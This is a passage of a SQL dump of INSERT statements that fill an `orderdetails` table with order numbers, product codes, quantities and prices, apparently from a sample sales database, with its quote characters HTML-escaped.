\u0026#39;31\u0026#39;, \u0026#39;57.78\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;39.71\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;91.34\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;87.75\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;94.92\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;72.00\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;67.37\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;163.44\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;126.52\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;71.82\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;65.13\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;136.70\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;52.84\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;120.53\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;66.49\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;53.27\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;77.61\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;37.01\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;83.68\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10169\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;75.66\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10170\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;116.27\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10170\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;93.28\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10170\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;70.07\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10170\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;130.60\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10171\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;134.46\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10171\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;128.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10171\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;165.95\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10171\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;34.74\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;109.51\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;139.87\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;61.00\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;43.27\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;79.97\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;77.91\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10172\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;87.81\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;101.71\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;51.75\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;168.30\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;55.09\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;127.13\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;140.06\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;56.84\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;86.92\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;90.28\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;77.31\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;58.44\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;29.87\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;39.42\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;98.65\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;35.70\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10173\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;93.49\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10174\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;207.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10174\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;113.44\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10174\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;108.50\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10174\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;100.30\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10174\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;44.27\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;119.67\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;109.02\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;101.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;59.55\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;150.71\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;102.92\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;121.40\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;32.18\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;89.57\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;50.86\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;56.24\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10175\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;80.92\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;166.24\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;145.04\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;160.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;139.17\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;140.75\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;55.49\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;101.72\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;62.14\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;109.96\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10176\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;52.14\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;113.37\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;92.77\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;82.50\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;115.52\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;79.66\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;58.67\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;77.95\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;64.33\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;88.15\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;83.42\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10177\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;52.96\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;131.92\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;127.73\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;70.54\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;104.81\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;67.82\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;65.75\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;68.77\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;64.15\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;86.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;91.74\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;68.11\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10178\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;41.71\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;82.79\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;105.04\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;66.65\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;86.90\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;63.97\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;43.20\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;75.81\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10179\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;80.00\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;76.56\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;99.91\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;164.61\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;131.04\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;48.46\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;59.06\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;147.31\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;98.05\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;61.70\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;60.95\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;68.71\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;33.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;102.05\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10180\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;74.85\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;155.66\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;113.92\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;67.03\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;107.10\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;124.56\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;124.44\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;74.69\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;129.45\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;130.68\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;147.33\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;73.17\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;120.53\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;137.04\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;45.28\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;32.85\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;54.49\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10181\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;122.17\u0026#39;, \u0026#39;9\u0026#39;); 